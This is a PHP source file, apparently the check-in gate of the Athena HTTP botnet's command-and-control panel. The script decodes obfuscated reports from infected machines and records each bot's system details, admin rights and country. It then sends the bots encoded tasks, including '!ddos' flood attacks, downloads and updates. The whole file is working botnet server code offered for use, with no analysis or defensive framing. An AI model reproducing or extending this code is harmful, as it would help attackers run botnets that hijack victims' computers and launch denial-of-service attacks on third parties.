<?php

	error_reporting(E_ERROR | E_WARNING | E_PARSE);
	
	define('AthenaHTTP', '');
	require_once './config.php';

	$country = getCountry(ip2long($_SERVER['REMOTE_ADDR']));

	if($_POST['a'] == NULL || $_POST['b'] == NULL || $_POST['c'] == NULL)
	{
		print "Location:" . $_SERVER['REMOTE_ADDR'] . ":" . $country[0];
		die();
	}
	
	$TASKS_OUTPUT = '';
	
	$KEY_strtr = base64_decode(urldecode($_POST['a']));
	$KEY_strtr_ARR = explode(':', $KEY_strtr);
	$DATA = urldecode($_POST['b']);
	$DATA = strtr($DATA, $KEY_strtr_ARR[1], $KEY_strtr_ARR[0]);
	$DATA = base64_decode($DATA);

	$OUTDATAMARKER = base64_encode(urldecode($_POST['c']));

	$DATA_ARR = explode('|', $DATA);

	$INTERVAL = mysql_fetch_array(mysql_query('SELECT data FROM config WHERE value = \'knock\';'));
	$TASKS_OUTPUT = base64_encode('|interval=' . $INTERVAL['data'] . '|') . "\n";

	foreach($DATA_ARR as $DATA_PART)
	{
		if($DATA_PART)
		{
			$KEY = explode(':', $DATA_PART);
			$KEY = $KEY[0];
			$VALUE = explode(':', $DATA_PART);
			$VALUE = $VALUE[1];
			
			if($KEY == 'type') $TYPE = $VALUE;
			if($KEY == 'uid') $UID = $VALUE;
			if($KEY == 'priv') $PRIV = $VALUE;
			if($KEY == 'arch') $ARCH = $VALUE;
			if($KEY == 'gend') $GEND = $VALUE;
			if($KEY == 'cores') $CORES = $VALUE;
			if($KEY == 'os') $OS = $VALUE;
			if($KEY == 'ver') $VER = $VALUE;
			if($KEY == 'net') $NET = $VALUE;
			if($KEY == 'new') $NEW = $VALUE;
			if($KEY == 'ram') $RAM = $VALUE;
			if($KEY == 'bk_killed') $KILLED = $VALUE;
			if($KEY == 'bk_files') $FILES = $VALUE;
			if($KEY == 'bk_keys') $REGKEY = $VALUE;
			if($KEY == 'busy') $BUSY = $VALUE;
			if($KEY == 'taskid') $TASKID = $VALUE;
			if($KEY == 'return') $RETURN = $VALUE;
		}
	}
	
	if(!$UID) $TASKS_OUTPUT = base64_encode('|ERROR_NOT_IN_DB|') . "\n" . $TASKS_OUTPUT;
	
	if($TYPE == 'on_exec')
	{
		$EXISTS = (mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE botid = \'' . $UID . '\' LIMIT 1;')) != 0);
		
		if(!$EXISTS)
		{
			mysql_query('DELETE FROM botlist WHERE ip = \'' . $_SERVER['REMOTE_ADDR'] . '\';');
			
			mysql_query('INSERT INTO botlist SET ' . 
						'botid=\'' . mysql_real_escape_string($UID) . '\', ' . 
						'newbot=\'' . mysql_real_escape_string($NEW) . '\', ' . 
						'country=\'' . mysql_real_escape_string($country[0]) . '\', ' . 
						'country_code=\'' . mysql_real_escape_string($country[1]) . '\', ' . 
						'ip=\'' . mysql_real_escape_string($_SERVER['REMOTE_ADDR']) . '\', ' . 
						'os=\'' . getOS($OS) . '\', ' . 
						'cpu=\'' . ($ARCH == 'x64' ? '0' : '1')  . '\', ' . 
						'type=\'' . ($GEND == 'laptop' ? '0' : '1') . '\', ' . 
						'cores=\'' . mysql_real_escape_string($CORES) . '\', ' . 
						'version=\'' . mysql_real_escape_string($VER) . '\', ' . 
						'net=\'' . mysql_real_escape_string($NET) . '\', ' . 
						'admin=\'' . ($PRIV == 'admin' ? '1' : '0') . '\', ' . 
						'busy=\'' . ($BUSY == 'true' ? '1' : '0') . '\', ' . 
						'lastseen=\'' . $TIME . '\';');
		}
		else
		{
			mysql_query('UPDATE botlist SET ' . 
						'ip=\'' . mysql_real_escape_string($_SERVER['REMOTE_ADDR']) . '\', ' . 
						'newbot=\'' . mysql_real_escape_string($NEW) . '\', ' . 
						'country=\'' . mysql_real_escape_string($country[0]) . '\', ' . 
						'country_code=\'' . mysql_real_escape_string($country[1]) . '\', ' . 
						'os=\'' . getOS($OS) . '\', ' . 
						'cpu=\'' . ($ARCH == 'x64' ? '0' : '1')  . '\', ' . 
						'type=\'' . ($GEND == 'laptop' ? '0' : '1') . '\', ' . 
						'cores=\'' . mysql_real_escape_string($CORES) . '\', ' . 
						'version=\'' . mysql_real_escape_string($VER) . '\', ' . 
						'net=\'' . mysql_real_escape_string($NET) . '\', ' . 
						'admin=\'' . ($PRIV == 'admin' ? '1' : '0') . '\', ' . 
						'busy=\'' . ($BUSY == 'true' ? '1' : '0') . '\', ' . 
						'lastseen=\'' . $TIME . '\' ' . 
						'WHERE botid=\'' . mysql_real_escape_string($UID) . '\';');
		}
	}
	else if($TYPE == 'repeat')
	{
		$EXISTS = (mysql_num_rows(mysql_query('SELECT id FROM botlist WHERE botid = \'' . $UID . '\' LIMIT 1;')) != 0);

		if(!$EXISTS) $TASKS_OUTPUT = base64_encode('|ERROR_NOT_IN_DB|') . "\n" . $TASKS_OUTPUT;
	
		mysql_query('UPDATE botlist SET ' . 
					'ip=\'' . mysql_real_escape_string($_SERVER['REMOTE_ADDR']) . '\', ' . 
					'country=\'' . mysql_real_escape_string($country[0]) . '\', ' . 
					'country_code=\'' . mysql_real_escape_string($country[1]) . '\', ' . 
					'ram=\'' . mysql_real_escape_string($RAM) . '\', ' . 
					'botskilled=\'' . mysql_real_escape_string($KILLED) . '\', ' . 
					'files=\'' . mysql_real_escape_string($FILES) . '\', ' . 
					'regkey=\'' . mysql_real_escape_string($REGKEY) . '\', ' . 
					'busy=\'' . ($BUSY == 'true' ? '1' : '0') . '\', ' . 
					'lastseen=\'' . $TIME . '\' ' . 
					'WHERE botid=\'' . mysql_real_escape_string($UID) . '\';');
	}
	else if($TYPE == 'response')
	{					
		$result = mysql_query('SELECT task FROM tasks WHERE id = \'' . mysql_real_escape_string($TASKID) . '\' LIMIT 1;');
		if($result)
		{
			$row = mysql_fetch_array($result);
			if($row['task'] == '!uninstall' || $row['task'] == '!download.update')
			{
				mysql_query('DELETE FROM botlist WHERE botid = \'' . mysql_real_escape_string($UID) . '\';');
			}
		}
		
		if($RETURN)
		{		
			$result = mysql_query('SELECT parameter FROM tasks WHERE id=\'' . mysql_real_escape_string($TASKID) . '\' LIMIT 1;');
			if(mysql_num_rows($result) == 1)
			{
				$row = mysql_fetch_array($result);
				
				mysql_query('INSERT INTO webcheck SET ' . 
							'botid=\'' . mysql_real_escape_string($UID) . '\', ' .
							'status=\'' . mysql_real_escape_string($RETURN) . '\', ' .
							'website=\'' . mysql_real_escape_string($row['parameter']) . '\';');			
			}
		}
		
		mysql_query('INSERT INTO tasks_done SET ' . 
						'botid=\'' . mysql_real_escape_string($UID) . '\', ' .
						'taskid=\'' . mysql_real_escape_string($TASKID) . '\';');
	}
	else
	{
		//print "Location:" . $_SERVER['REMOTE_ADDR'] . ":" . $country[0];
		die();
	}
	
	$BOTINFO = mysql_fetch_array(mysql_query('SELECT country, os, cpu, type, version, net, admin, busy FROM botlist WHERE botid = \'' . mysql_real_escape_string($UID) . '\' LIMIT 1;'));
	$result = mysql_query(' SELECT id, task, parameter FROM tasks 
							WHERE
							(
								(
									tasks.id <> 
									ALL
									(
										SELECT tasks_done.taskid FROM tasks_done WHERE tasks_done.botid = \'' . mysql_real_escape_string($UID) . '\'
									)
								)
								AND 
								(
									(tasks.limit > ALL(SELECT Count(*) FROM tasks_done WHERE tasks_done.taskid = tasks.id)) OR
									(tasks.limit = \'*\')
								)
								AND 
								(
									(tasks.country = \'*\' OR tasks.country LIKE \'%' . mysql_real_escape_string($BOTINFO['country']) . '%\') AND
									(tasks.os = \'*\' OR tasks.os LIKE \'%' . mysql_real_escape_string($BOTINFO['os']) . '%\') AND
									(tasks.cpu = \'*\' OR tasks.cpu LIKE \'%' . mysql_real_escape_string($BOTINFO['cpu']) . '%\') AND
									(tasks.type = \'*\' OR tasks.type LIKE \'%' . mysql_real_escape_string($BOTINFO['type']) . '%\') AND
									(tasks.version = \'*\' OR tasks.version LIKE \'%' . mysql_real_escape_string($BOTINFO['version']) . '%\') AND
									(tasks.net = \'*\' OR tasks.net LIKE \'%' . mysql_real_escape_string($BOTINFO['net']) . '%\') AND
									(tasks.admin = \'*\' OR tasks.admin LIKE \'%' . mysql_real_escape_string($BOTINFO['admin']) . '%\') AND 
									(tasks.botid = \'*\' OR tasks.botid = \'' . mysql_real_escape_string($UID) . '\') AND 
									(tasks.task NOT LIKE \'!ddos.http%\') AND
									(tasks.task NOT LIKE \'!ddos.layer4%\')
								)
							);');
	
	while($row = mysql_fetch_array($result))
	{
		$TASKS_OUTPUT .= base64_encode('|taskid=' . $row['id'] . '|command=' . $row['task'] . ($row['parameter'] != '' ? ' ' . $row['parameter'] : '') . '|') . "\n";
	}
	
	if($BOTINFO['busy'] == 0)
	{
		$result = mysql_query(' SELECT id, task, parameter FROM tasks
								WHERE
								(
									(
										tasks.id <> 
										ALL
										(
											SELECT tasks_done.taskid FROM tasks_done WHERE tasks_done.botid = \'' . mysql_real_escape_string($UID) . '\'
										)
									)
									AND
									(
										(tasks.task NOT LIKE \'!ddos.browser%\') AND
										(tasks.task != \'!ddos.stop\') AND
										(tasks.task LIKE \'!ddos.%\')
									)
								)
								LIMIT 1;');
		
		while($row = mysql_fetch_array($result)) 
		{
			$TASKS_OUTPUT .= base64_encode('|taskid=' . $row['id'] . '|command=' . $row['task'] . ($row['parameter'] != '' ? ' ' . $row['parameter'] : '') . '|') . "\n";
		}
	}

	print $OUTDATAMARKER . strtr(base64_encode($TASKS_OUTPUT), $KEY_strtr_ARR[0], $KEY_strtr_ARR[1]);

	////////////////////////////////////////
	////////////////////////////////////////
	
	function getOS($OS)
	{
		switch($OS)
		{
			case 'UNKW':
				return 'Unknown';
			case 'W_2K':
				return 'Windows 2000';
			case 'W_XP':
				return 'Windows XP';
			case 'W2K3':
				return 'Windows 2003';
			case 'WVIS':
				return 'Windows Vista';
			case 'WIN7':
				return 'Windows 7';
			case 'WIN8':
				return 'Windows 8';
			case 'ERRO':
				return 'Unknown';
			
			default:
				return 'Unknown';
		}
	}
	
	function getCountry($ip2long)
	{
		$result = mysql_query('SELECT country_name, country_code FROM ip_country WHERE \'' . mysql_real_escape_string($ip2long) . '\' BETWEEN ip_start_long AND ip_end_long LIMIT 1;');
		if(mysql_num_rows($result) == 0)
		{
			return array('Unknown', '00');
		}
		else
		{
			$row = mysql_fetch_array($result);
			return array($row[0], $row[1]);
		}
	}
	
	function rc4($data, $pwd)
	{
		$key[] = '';
		$box[] = '';
		$cipher = '';

		$pwd_length = strlen($pwd);
		$data_length = strlen($data);

		for ($i = 0; $i < 256; $i++)
		{
			$key[$i] = ord($pwd[$i % $pwd_length]);
			$box[$i] = $i;
		}
		for ($j = $i = 0; $i < 256; $i++)
		{
			$j = ($j + $box[$i] + $key[$i]) % 256;
			$tmp = $box[$i];
			$box[$i] = $box[$j];
			$box[$j] = $tmp;
		}
		for ($a = $j = $i = 0; $i < $data_length; $i++)
		{
			$a = ($a + 1) % 256;
			$j = ($j + $box[$a]) % 256;
			$tmp = $box[$a];
			$box[$a] = $box[$j];
			$box[$j] = $tmp;
			$k = $box[(($box[$a] + $box[$j]) % 256)];
			$cipher .= chr(ord($data[$i]) ^ $k);
		}
		return $cipher;
	}
	
?>